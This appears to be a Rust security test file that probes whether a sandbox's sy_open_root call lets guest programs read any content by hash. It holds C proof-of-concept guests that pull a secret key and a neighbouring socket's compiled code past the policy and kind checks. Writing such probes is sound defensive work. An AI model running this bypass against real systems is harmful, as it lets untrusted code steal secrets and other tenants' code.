//! Probe: `sy_open_root` is a CAS-wide read oracle with no tree-read
//! declaration check (hypothesis `open-root-cas-oracle`).
//!
//! Code reading that motivates this probe:
//!
//! * `h_open_root` (crates/synch-sock/src/runtime/helpers.rs:913-926) checks
//!   only `init_mode`. It never consults `policy.tree_read_allowed`, unlike
//!   `open_common` (helpers.rs:861-881), which refuses an undeclared
//!   `sy_open_from` with `SY_EPERM`. `policy.rs:146` is the only call site of
//!   `tree_read_allowed`, so no policy check stands between a guest and
//!   `host.open_root`.
//! * The engine's `TreeHost::open_root`
//!   (crates/synch-engine/src/sockets.rs:665-680) answers
//!   `store().blob(root)` — the node-wide content-addressed store, with no
//!   origin, space, or entry-kind scoping, and reports `kind: 0`. `TreeHost::pread`
//!   (sockets.rs:748-778) reads the same CAS by root, fetching missing groups
//!   from remote providers. Meanwhile `TreeHost::info` (sockets.rs:617-643)
//!   refuses `EntryKind::Socket` for path opens, so a socket cannot read its
//!   neighbours' code — a refusal `open_root` knows nothing about.
//!
//! Two probes, run as two tests:
//!
//! (a) Policy bypass: an invocation armed with *zero* tree-read declarations
//!     (and a caller who is a delegate restricted to space `code`) reads the
//!     bytes of `secrets/key.pem` by content hash. The same program's
//!     `sy_open_from` of the same path is refused with `SY_EPERM`, proving the
//!     declaration check exists and was bypassed, not absent.
//! (b) Socket-kind bypass: against a custom `SocketHost` that mirrors the
//!     engine's split — `open` refuses a `.sock` path with
//!     `HostError::NotReadable` exactly as `TreeHost::info` does, while
//!     `open_root` resolves any content by hash with `kind: 0` — the guest
//!     reads the ELF bytes of a neighbouring socket by hash. `sy_open` of the
//!     same path is refused, proving the kind check was bypassed.
//!
//! A break is the secret (or ELF) bytes crossing the stream back to the
//! caller.

#![cfg(all(
    any(target_os = "linux", target_os = "macos", target_os = "openbsd"),
    any(target_arch = "x86_64", target_arch = "aarch64")
))]

mod harness;

use std::sync::Arc;

use harness::{compile, peer, Harness};
use synch_core::{Hash, SockStatus};
use synch_sock::{DuplexStream, EffectivePolicy, HostError, ObjectInfo, SocketHost};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// Guest-side plumbing shared by both probes: an unbuffered writer with the
/// backpressure dance, a decimal printer, and a pread loop with the
/// documented EAGAIN-then-poll shape.
const COMMON_C: &str = r#"
#include <synch.h>

static sy_s64 wr_all(const char *p, sy_u64 len) {
  sy_u64 off = 0;
  while (off < len) {
    sy_s64 w = sy_write(SY_SELF, p + off, len - off);
    if (w > 0) { off += (sy_u64)w; continue; }
    if (w == SY_EAGAIN) {
      struct sy_pollfd fds[1] = { { SY_SELF, SY_POLL_OUT, 0 } };
      if (sy_poll(fds, 1, 1000) <= 0) return -100;
      continue;
    }
    return w;
  }
  return 0;
}

static void wr_num(sy_s64 v) {
  char buf[24];
  char tmp[20];
  int i = 0;
  int j = 0;
  unsigned long long u;
  if (v < 0) { buf[i++] = '-'; u = (unsigned long long)(-v); }
  else { u = (unsigned long long)v; }
  do { tmp[j++] = (char)('0' + (u % 10)); u /= 10; } while (u);
  while (j > 0) { buf[i++] = tmp[--j]; }
  wr_all(buf, (sy_u64)i);
}

/* pread the whole object to SY_SELF; returns 0 on success. */
static sy_s64 dump(sy_s64 h) {
  char buf[128];
  sy_u64 off = 0;
  for (;;) {
    sy_s64 n = sy_pread(h, buf, sizeof buf, off);
    if (n == SY_EAGAIN) {
      struct sy_pollfd fds[1] = { { h, SY_POLL_IN, 0 } };
      if (sy_poll(fds, 1, 2000) <= 0) { wr_all(SY_STR("POLLFAIL\n")); return 2; }
      continue;
    }
    if (n < 0) { wr_all(SY_STR("PREADERR\n")); return 3; }
    if (n == 0) break;
    if (wr_all(buf, (sy_u64)n) != 0) return 4;
    off += (sy_u64)n;
  }
  return 0;
}
"#;

/// (a) The policy-bypass probe. `@ROOT@` is replaced with the decimal byte
/// list of the target blob's content root.
const POLICY_PROBE_C: &str = r#"
SY_ENTRY sy_s64 entry(void) {
  sy_u8 root[32] = { @ROOT@ };

  /* Contrast: the same content by path from a foreign origin must be
   * refused, because this program declared no tree reads at arm time. */
  sy_s64 of = sy_open_from(SY_STR("nas@cluster.example"), SY_STR("secrets/key.pem"));
  wr_all(SY_STR("OPEN_FROM="));
  wr_num(of);
  wr_all(SY_STR("\n"));

  /* The attack: the same content by hash. */
  sy_s64 h = sy_open_root(root);
  wr_all(SY_STR("OPEN_ROOT="));
  wr_num(h);
  wr_all(SY_STR("\n"));
  if (h < 0) return 1;

  wr_all(SY_STR("DATA:"));
  sy_s64 rc = dump(h);
  wr_all(SY_STR("\n"));
  return rc;
}
"#;

/// (b) The socket-kind bypass probe.
const KIND_PROBE_C: &str = r#"
SY_ENTRY sy_s64 entry(void) {
  sy_u8 root[32] = { @ROOT@ };

  /* Contrast: opening the neighbour socket by path must be refused. */
  sy_s64 so = sy_open(SY_STR("code/neighbour.sock"));
  wr_all(SY_STR("OPEN_SOCK="));
  wr_num(so);
  wr_all(SY_STR("\n"));

  /* The attack: the same socket's bytes by content hash. */
  sy_s64 h = sy_open_root(root);
  wr_all(SY_STR("OPEN_ROOT="));
  wr_num(h);
  wr_all(SY_STR("\n"));
  if (h < 0) return 1;

  wr_all(SY_STR("DATA:"));
  sy_s64 rc = dump(h);
  wr_all(SY_STR("\n"));
  return rc;
}
"#;

/// Renders a 32-byte root as a C initializer list.
fn root_init(root: &Hash) -> String {
    root.as_bytes()
        .iter()
        .map(|b| b.to_string())
        .collect::<Vec<_>>()
        .join(", ")
}

fn build_guest(template: &str, root: &Hash, name: &str) -> Vec<u8> {
    let source = format!("{}\n{}", COMMON_C, template).replace("@ROOT@", &root_init(root));
    compile(&source, name)
}

/// A host that mirrors the engine's `TreeHost` split: path opens refuse
/// socket-kind entries (`TreeHost::info`, sockets.rs:622-626), while
/// `open_root` resolves any content in the store by hash alone and reports
/// `kind: 0` (`TreeHost::open_root`, sockets.rs:665-680).
struct KindAwareTree {
    /// path -> (entry kind as SY_KIND_*, content)
    files: std::collections::HashMap<String, (u32, Vec<u8>)>,
}

#[async_trait::async_trait]
impl SocketHost for KindAwareTree {
    fn open(&self, _origin: Option<&str>, path: &str) -> Result<ObjectInfo, HostError> {
        let (kind, bytes) = self.files.get(path).ok_or(HostError::NotFound)?;
        if *kind == 4 {
            return Err(HostError::NotReadable(
                "that path is a socket; a socket does not read out its neighbours' code".into(),
            ));
        }
        Ok(ObjectInfo {
            root: Hash::new(bytes),
            size: bytes.len() as u64,
            mtime_ns: 42,
            mode: 0o644,
            kind: *kind,
        })
    }

    fn open_root(&self, root: &Hash) -> Result<ObjectInfo, HostError> {
        // The engine's version: store().blob(root), node-wide, kind 0.
        let (_, bytes) = self
            .files
            .values()
            .find(|(_, b)| Hash::new(b) == *root)
            .ok_or(HostError::NotFound)?;
        Ok(ObjectInfo {
            root: *root,
            size: bytes.len() as u64,
            mtime_ns: 0,
            mode: 0,
            kind: 0,
        })
    }

    fn list(&self, prefix: &str) -> Result<Vec<String>, HostError> {
        let mut names: Vec<String> = self
            .files
            .keys()
            .filter(|k| k.starts_with(prefix))
            .cloned()
            .collect();
        names.sort();
        Ok(names)
    }

    async fn pread(&self, root: Hash, offset: u64, len: u64) -> Result<Vec<u8>, HostError> {
        let (_, bytes) = self
            .files
            .values()
            .find(|(_, b)| Hash::new(b) == root)
            .ok_or(HostError::NotFound)?;
        let start = (offset as usize).min(bytes.len());
        let end = (start + len as usize).min(bytes.len());
        Ok(bytes[start..end].to_vec())
    }
}

/// `exchange` against an explicit host, for the kind-bypass probe.
async fn exchange_with_host(
    harness: &Harness,
    host: Arc<dyn SocketHost>,
    elf: &[u8],
    input: &[u8],
) -> (SockStatus, Vec<u8>) {
    let (mine, theirs) = tokio::io::duplex(64 * 1024);
    let (their_r, their_w) = tokio::io::split(theirs);
    let mut invocation = harness.invocation(
        elf,
        DuplexStream::new(their_r, their_w),
        EffectivePolicy::default(),
        peer(Some(vec!["code".into()])),
        vec![],
    );
    invocation.host = host;

    let mut mine = mine;
    let input = input.to_vec();
    let driver = tokio::spawn(async move {
        let _ = mine.write_all(&input).await;
        let _ = mine.shutdown().await;
        let mut out = Vec::new();
        mine.read_to_end(&mut out).await.unwrap();
        out
    });

    let outcome = harness.pool.run(invocation).await.expect("the program ran");
    let out = driver.await.unwrap();
    (outcome.status, out)
}

/// (a) Zero tree-read declarations, a delegate restricted to space `code`,
/// and the bytes of `secrets/key.pem` still come back over the stream.
#[tokio::test]
async fn open_root_reads_a_blob_with_zero_tree_read_declarations() {
    const SECRET: &str = "PRIVATE-KEY-MATERIAL: 0123456789abcdef do not exfiltrate";
    let root = Hash::new(SECRET.as_bytes());
    let elf = build_guest(POLICY_PROBE_C, &root, "policy-probe.c");

    let harness = Harness::with_tree(&[("secrets/key.pem", SECRET)]);
    let (status, out) = harness::exchange(
        &harness,
        &elf,
        b"",
        // The armed declaration showed no tree reads at all.
        EffectivePolicy::default(),
        // And the caller is a delegate who may read only space `code` —
        // never `secrets`.
        peer(Some(vec!["code".into()])),
        vec![],
    )
    .await;

    let text = String::from_utf8_lossy(&out);
    eprintln!("status: {status:?}\nreply:\n{text}");

    // The contrast must hold: the declaration check exists and fired.
    assert!(
        text.contains("OPEN_FROM=-4"),
        "sy_open_from without a declaration must be SY_EPERM, got: {text}"
    );

    // The break: the same bytes came back anyway, by hash.
    assert!(
        !text.contains("OPEN_ROOT=-"),
        "sy_open_root must fail for containment; it returned a handle: {text}"
    );
    assert!(
        out.windows(SECRET.len()).any(|w| w == SECRET.as_bytes()),
        "BREAK: the secret crossed the stream with zero tree-read declarations; reply: {text}"
    );
    assert_eq!(
        status,
        SockStatus::Ok(0),
        "the exfiltrating program ran to a clean completion"
    );
}

/// (b) `sy_open` refuses a socket entry; `sy_open_root` hands over the same
/// socket's ELF bytes by hash.
#[tokio::test]
async fn open_root_reads_socket_code_that_sy_open_refuses() {
    // The neighbour socket: a real compiled eBPF object, as the tree would
    // hold for an armed socket.
    let neighbour = compile(
        "#include <synch.h>\nSY_ENTRY sy_s64 entry(void) { return 7; }\n",
        "neighbour.c",
    );
    let root = Hash::new(&neighbour);
    let elf = build_guest(KIND_PROBE_C, &root, "kind-probe.c");

    let mut files = std::collections::HashMap::new();
    files.insert("code/neighbour.sock".to_string(), (4u32, neighbour.clone()));
    let host: Arc<KindAwareTree> = Arc::new(KindAwareTree { files });

    let harness = Harness::new();
    let (status, out) = exchange_with_host(&harness, host, &elf, b"").await;

    let text = String::from_utf8_lossy(&out);
    eprintln!("status: {status:?}\nreply: {} bytes\n{text}", out.len());

    // The contrast must hold: the path open of the socket was refused.
    assert!(
        text.contains("OPEN_SOCK=-4"),
        "sy_open of a socket path must be SY_EPERM, got: {text}"
    );

    // The break: the neighbour socket's ELF bytes came back by hash. The
    // whole object is dumped; check the ELF header and the exact length.
    let start = out
        .windows(5)
        .position(|w| w == b"DATA:")
        .map(|i| i + 5)
        .expect("no DATA section in reply");
    let data = &out[start..out.len().min(start + neighbour.len())];
    assert!(
        data.starts_with(b"\x7fELF"),
        "BREAK: socket ELF bytes crossed the stream; first bytes: {:?}",
        data.get(..16)
    );
    assert_eq!(
        data.len(),
        neighbour.len(),
        "BREAK: the entire neighbour socket object was exfiltrated by hash"
    );
    assert_eq!(status, SockStatus::Ok(0));
}
